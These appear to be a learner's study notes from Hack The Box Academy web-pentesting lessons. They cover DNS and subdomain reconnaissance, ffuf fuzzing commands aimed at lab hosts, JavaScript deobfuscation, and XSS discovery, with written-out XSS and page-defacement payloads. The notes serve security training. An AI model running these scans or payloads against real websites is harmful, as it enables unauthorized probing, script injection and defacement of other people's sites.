# Web Recon
## Whois
* Whois domain.com

## DNS

### Tools

- dig
	- dig domain.com
	- dig @1.1.1.1 domain.com - specifies a specific name server to query
	- dig domain.com ANY\
	- dig axfr domena.pl @dns-server
- dnslookup
- host
- dnsenum -> this one is good
- fierce
- dnsrecon


## Subdomains
### Purpose for looking subdomain:

- Development and Staging Environments
- Hidden Login Portals
- Legacy Applications
- Sensitive Information

```
In DNS subdomains are typically represented by A, which map the subdomain name to its corresponding IP address. Additionally, CNAME records might be used to create aliases for subdomains
 ```

### Active Subdomain Enumeration
#### * DNS Zone Transfer

#### * Brute-force
Process of brakes down into four steps:

Wordlist Selection: 
        General-Purpose
        Targeted
        Custom
Iteration and Querying
DNS Lookup: A DNS query is performed for each potential subdomain to check if it resolves to an IP address. This is typically done using the A or AAAA record type.
Filtering and Validation

* list: 
	* seclists/Discovery/DNS/subdomains-top1million-110000.txt
	* seclists/Discovery/DNS/subdomains-top1million-20000.txt 

#### * Dnsenum 
#### * Ffuf 
#### * Gobuster

### Passive Subdomain Enumeration
- crt.sh
- Certifiete transparency (CT)
- search engines (google)


## VirtualHosts
### Tools
* gobuster
	* gobuster vhost -u http://<target_IP_address> -w <wordlist_file> --append-domain
* ffuf
* Feroxbuster


## Fingerprinting
### Tools:
* Wappalyzer
* BuiltWith
* WhatWeb
* Nmap
* Netcraft
* wafw00f
* Nikto
* Nuklei


## Crawling
## Valuable Information
* Links
* Comments
* Metadata - Metadata refers to data about data
* Sensitive Filses - This includes backup files (e.g., .bak, .old), configuration files (e.g., web.config, settings.php), log files (e.g., error_log, access_log), and other files containing passwords, API keys, or other confidential information. 
* python
---
* robots.txt
* security.txt
* /.well-known/change-password
* openid-configuration
* assetlinks.json
* mta-sts.txt

## Popular Web Crawler
* Burp Suite
* ZAP
* Scrapy
* Apache Nutch
* ReconSpider



# FFUF
## Basic Fuzzing
-ic - get rid of copytright line
-fs - filter size

#### Directory Fuzzing:
- ffuf -w /list:FUZZ -u https://target.com/FUZZ

### Page fuzzing
* ffuf -w /opt/useful/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://SERVER_IP:PORT/blog/indexFUZZ
* ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php


### Recursive Fuzzing
- recursion
- recursion-depth
## Domain Fuzzing

### Subdomain
* ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://FUZZ.academy.htb/

### Vhost
* ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb'

## GET Parameters
* ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx

## POST
Tip: In PHP, "POST" data "content-type" can only accept "application/x-www-form-urlencoded". So, we can set that in "ffuf" with "-H 'Content-Type: application/x-www-form-urlencoded'".

* ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx

* curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded'


## Value Fuzzing:
### Generate list
* for i in $(seq 1 1000); do echo $i >> ids.txt; done
### Value Fuzzing
* ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx

# Javascript Deobfuscation
* look for ```*.js```

### Deobfuscation tools
* https://jsconsole.com/
* https://javascript-minifier.com/
* http://beautifytools.com/javascript-obfuscator.php

### Advanced Deobfuscation
#### Tools
* https://matthewfl.com/unPacker.html
* https://obfuscator.io/

Tip: Ensure you do not leave any empty lines before the script, as it may affect the deobfuscation process and give inaccurate results.
Tip: We add the "-s" flag to reduce cluttering the response with unnecessary data

```
function generateSerial() {
  ...SNIP...
  var xhr = new XMLHttpRequest;
  var url = "/serial.php";
  xhr.open("POST", url, true);
  xhr.send(null);
};
```
### Summary

* First, we uncovered the HTML source code of the webpage and located the JavaScript code.
* Then, we learned about various ways to obfuscate JavaScript code.
* After that, we learned how to beautify and deobfuscate minified and obfuscated JavaScript code.
* Next, we went through the deobfuscated code and analyzed its main function
* We then learned about HTTP requests and were able to replicate the main function of the obfuscated JavaScript code.
* Finally, we learned about various methods to encode and decode strings.

### To try:
Machines
* Hackback I

Challenges
* Query M
* Canvas E
* Hypercraft M
* Fake News E

Fortresses
* Jet
* AWS

# XSS

## Stored XSS

```
Tip: Many modern web applications utilize cross-domain IFrames to handle user input, so that even if the web form is vulnerable to XSS, it would not be a vulnerability on the main web application. This is why we are showing the value of window.origin in the alert box, instead of a static value like 1. In this case, the alert box would reveal the URL it is being executed on, and will confirm which form is the vulnerable one, in case an IFrame was being used.
```

* <script>alert()</script>
* <script>print()</script>

## Reflected XSS

* check, if address contain some value from the user

## DOM XSS

### Source & Sink
```
Sink is the function that writes the user input to a DOM Object. 
```
* document.write()
* DOM.innerHTML
* DOM.outerHTML

```
jQuery sink's
```

* add()
* after()
* append()

Example:
```
var pos = document.URL.indexOf("task=");
var task = document.URL.substring(pos + 5, document.URL.length);
document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);
```

### DOM ATTACKS
```
<img src="" onerror=alert(window.origin)>
```

## XSS Discovery

### Automated Discovery

```
Scanners usually do two types of scanning: A Passive Scan, which reviews client-side code for potential DOM-based vulnerabilities, and an Active Scan, which sends various types of payloads to attempt to trigger an XSS through payload injection in the page source.
```
#### Tools:
* XSS Strike
```
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt
python xsstrike.py
python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" 
```
* Brute XSS
* XSSer


### Manual Discovery
* Payloads:

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md

https://github.com/payloadbox/xss-payload-list

```
Note: XSS can be injected into any input in the HTML page, which is not exclusive to HTML input fields, but may also be in HTTP headers like the Cookie or User-Agent (i.e., when their values are displayed on the page).
```
```
Better way to look for XSS is write a python script, compare to manually test
<PLACE FOR SCRIPT>

```

* Code Review


## Defacing
Changing its look for anyone who visits the website

### Defacement Elements

* Background Color document.body.style.background
```
<script>document.body.style.background = "#141d2b"</script>

Tip: Here we set the background color to the default Hack The Box background color. We can use any other hex value, or can use a named color like = "black".
```

* Background document.body.background
```
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
```
* Page Title document.title
```
<script>document.title = 'HackTheBox Academy'</script>
```
* Page Text DOM.innerHTML
```
document.getElementById("todo").innerHTML = "New Text"
$("#todo").html('New Text');
document.getElementsByTagName('body')[0].innerHTML = "New Text"

Tip: It would be wise to try running our HTML code locally to see how it looks and to ensure that it runs as expected, before we commit to it in our final payload.
```
```
<div></div><ul class="list-unstyled" id="todo"><ul>
<script>document.body.style.background = "#141d2b"</script>
</ul><ul><script>document.title = 'HackTheBox Academy'</script>
</ul><ul><script>document.getElementsByTagName('body')[0].innerHTML = '...SNIP...'</script>
</ul></ul>

```

